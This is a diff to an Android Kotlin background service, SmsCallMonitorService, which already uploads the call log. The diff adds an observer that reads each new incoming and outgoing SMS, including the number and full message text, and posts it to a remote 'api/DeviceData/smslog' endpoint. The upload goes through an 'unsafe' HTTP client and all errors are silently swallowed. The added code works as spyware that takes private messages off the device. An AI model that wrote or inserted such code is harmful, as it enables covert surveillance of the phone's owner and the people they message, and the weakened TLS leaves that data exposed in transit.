@@ -22,11 +22,15 @@ import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
 import java.time.Instant
 import com.google.gson.annotations.SerializedName
+import android.provider.Telephony
 
 class SmsCallMonitorService : Service() {
     private var observerThread: HandlerThread? = null
     private var callLogObserver: ContentObserver? = null
     private var lastSentId: Long = -1L
+    private var smsObserver: ContentObserver? = null
+    private var lastSmsInboxId: Long = -1L
+    private var lastSmsSentId: Long = -1L
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
@@ -44,6 +48,16 @@ class SmsCallMonitorService : Service() {
             }
         }
         contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
+
+        smsObserver = object : ContentObserver(handler) {
+            override fun onChange(selfChange: Boolean) {
+                onChange(selfChange, null)
+            }
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                processLatestSms()
+            }
+        }
+        contentResolver.registerContentObserver(Uri.parse("content://sms"), true, smsObserver!!)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -123,9 +137,59 @@ class SmsCallMonitorService : Service() {
         }
     }
 
+    private fun sendSmsEvent(dto: SmsDto) {
+        val retrofit = Retrofit.Builder()
+            .baseUrl(HttpClient.BASE_URL)
+            .addConverterFactory(GsonConverterFactory.create())
+            .client(HttpClient.getUnsafeOkHttpClient())
+            .build()
+        val api = retrofit.create(ApiSms::class.java)
+        val payload = listOf(dto)
+        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
+        api.send(body).enqueue(object : retrofit2.Callback<Void> {
+            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
+            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
+        })
+    }
+
+    private fun processLatestSms() {
+        processLatestSmsFrom(Uri.parse("content://sms/inbox"), isSent = false)
+        processLatestSmsFrom(Uri.parse("content://sms/sent"), isSent = true)
+    }
+
+    private fun processLatestSmsFrom(uri: Uri, isSent: Boolean) {
+        val projection = arrayOf("_id", "address", "body", "date")
+        var cursor: Cursor? = null
+        try {
+            cursor = contentResolver.query(uri, projection, null, null, "date DESC")
+            if (cursor != null && cursor.moveToFirst()) {
+                val id = cursor.getLong(cursor.getColumnIndexOrThrow("_id"))
+                val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
+                val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
+                val date = cursor.getLong(cursor.getColumnIndexOrThrow("date"))
+                if (isSent) {
+                    if (id != lastSmsSentId) {
+                        lastSmsSentId = id
+                        sendSmsEvent(SmsDto(address = address, body = body, type = "OUTGOING", date = Instant.ofEpochMilli(date).toString()))
+                    }
+                } else {
+                    if (id != lastSmsInboxId) {
+                        lastSmsInboxId = id
+                        sendSmsEvent(SmsDto(address = address, body = body, type = "INCOMING", date = Instant.ofEpochMilli(date).toString()))
+                    }
+                }
+            }
+        } catch (e: SecurityException) {
+        } catch (e: Exception) {
+        } finally {
+            cursor?.close()
+        }
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         if (callLogObserver != null) contentResolver.unregisterContentObserver(callLogObserver!!)
+        if (smsObserver != null) contentResolver.unregisterContentObserver(smsObserver!!)
         observerThread?.quitSafely()
     }
 
@@ -134,11 +198,23 @@ class SmsCallMonitorService : Service() {
         fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
     }
 
+    interface ApiSms {
+        @retrofit2.http.POST("api/DeviceData/smslog")
+        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
+    }
+
     data class CallDto(
         @SerializedName("Number") val number: String?,
         @SerializedName("Date") val date: String,
         @SerializedName("Type") val type: String,
         @SerializedName("Duration") val duration: Int?
+    )
+
+    data class SmsDto(
+        @SerializedName("Address") val address: String?,
+        @SerializedName("Body") val body: String?,
+        @SerializedName("Type") val type: String,
+        @SerializedName("Date") val date: String
     )
 
     companion object {
